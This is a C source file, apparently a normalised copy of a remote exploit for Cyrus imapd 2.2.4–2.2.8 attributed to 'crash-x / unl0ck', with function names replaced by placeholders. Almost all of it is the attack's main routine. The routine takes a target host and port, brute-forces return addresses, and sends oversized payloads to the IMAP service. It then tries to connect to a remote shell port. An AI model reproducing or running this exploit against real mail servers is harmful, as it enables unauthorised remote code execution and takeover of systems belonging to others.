#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct sockaddr_in {int dummy; } ;
typedef  int /*<<< orphan*/  fd_set ;
struct TYPE_2__ {char* platform; int retloc; } ;

/* Variables and functions */
 int RET_BF_END ; 
 int RET_BF_START ; 
 char* SHELL_PORT ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (struct sockaddr_in,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,int,int) ; 
 int /*<<< orphan*/  FUNC4 (struct sockaddr_in,int,int) ; 
 int FUNC5 (int,char**,char*) ; 
 char* FUNC6 (int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int /*<<< orphan*/  FUNC8 (struct sockaddr_in*,char*) ; 
 int /*<<< orphan*/  FUNC9 (int,char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (int,int,int) ; 
 int FUNC11 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (struct sockaddr_in,int) ; 

int FUNC14(int argc, char **argv){
    char *payload = NULL, *hostn = NULL, buffer[1024], *ptr;
    int i, first, sock, opt, target = 0, port = 143,
        shell_port = FUNC0(SHELL_PORT), sleeps = 1, 
        p_size=10000, ret_bf_start = RET_BF_START, 
        ret_bf_end = RET_BF_END, vulncheck = 1; 
    fd_set fds;
	struct sockaddr_in addr;
  
    FUNC7("[!] Cyrus imapd 2.2.4 - 2.2.8 remote exploit by crash-x / unl0ck\n");

    if (argc < 2)
        FUNC12(argv[0]);
    
    while ((opt = FUNC5 (argc, argv, "h:p:t:s:P:S:E:vV")) != -1){
        switch (opt){
	        case 'h':
	            hostn = optarg;
	            break;
	        case 'p':
                port = FUNC0(optarg);
                if(port > 65535 || port < 1){
                    FUNC7("[-] Port %d is invalid\n",port);
                    return 1;
                }
                break;
            case 't':
                target = FUNC0(optarg);
                for(i = 0; targets[i].platform; i++);
                if(target >= i && target != 1337){
                    FUNC7("[-] Wtf are you trying to target?\n");
                    FUNC12(argv[0]);
                }
                break;
            case 'S':
                ret_bf_start = FUNC11(optarg,NULL,0);
                if(!ret_bf_start){
                    FUNC7("[-] Wtf thats not a valid bruteforce start address!\n");
                    FUNC12(argv[0]);
                }
                break;
            case 'E':
                ret_bf_end = FUNC11(optarg,NULL,0);
                if(!ret_bf_end){
                    FUNC7("[-] Wtf thats not a valid bruteforce end address!\n");
                    FUNC12(argv[0]);
                }
                break;
            case 's': 
                sleeps = FUNC0(optarg);
                break;
            case 'P': 
                p_size = FUNC0(optarg);
                if(p_size < 1000){
                    FUNC7("[-] Its a bad idea to have a payload with less than 1000 bytes :)\n");
                    return 1;
                }
                break;
            case 'v':
                vulncheck = 2;
                break;
            case 'V':
                vulncheck = 0;
                break;
        	default:
                FUNC12(argv[0]);
        }
    }

    if(hostn == NULL)
        FUNC12(argv[0]);

    if(payload == NULL){
        if(!(payload = FUNC6(p_size))){
            FUNC7("[-] Wasnt able to allocate space for the payload!\n");
            return 1;
        }
    }

    FUNC8(&addr, hostn);

    if(vulncheck == 2){
        FUNC13(addr, port);
        return 1;
    }
    else if(vulncheck == 1)
        FUNC13(addr, port);

    if(target != 1337){
        ret_bf_start = targets[target].retloc;
        ret_bf_end = targets[target].retloc+5;
        FUNC7 ("[!] Targeting %s\n", targets[target].platform);
    } else
        FUNC7("[!] Starting bruteforce attack!\n");

    for(i = 0, first = 1; ret_bf_start < ret_bf_end; i++, first++){
        if((sock = FUNC2(addr, port)) == -1){
            if(first != 1)
                FUNC7("\n");
            FUNC7("[-] Connecting failed!\n");
            break;
        }
        if(i == 4)
            ret_bf_start += (p_size -  (p_size/10));
        else
            ret_bf_start++;
        FUNC3(payload, p_size, ret_bf_start, 1);
        FUNC10(ret_bf_start, ret_bf_start + (p_size - (p_size/10)),
                ret_bf_start + (p_size - (p_size/10/2)));
        FUNC9(sock, "%s\r\n", payload);
        if(i == 4){
            FUNC4(addr, shell_port, sleeps);
            i = 0;
        }
        if(ret_bf_start >=  ret_bf_end)
            FUNC7("[-]\n");
        FUNC1(sock);
    }
    FUNC7("[-] Exploit failed!\n");
    return 1;
}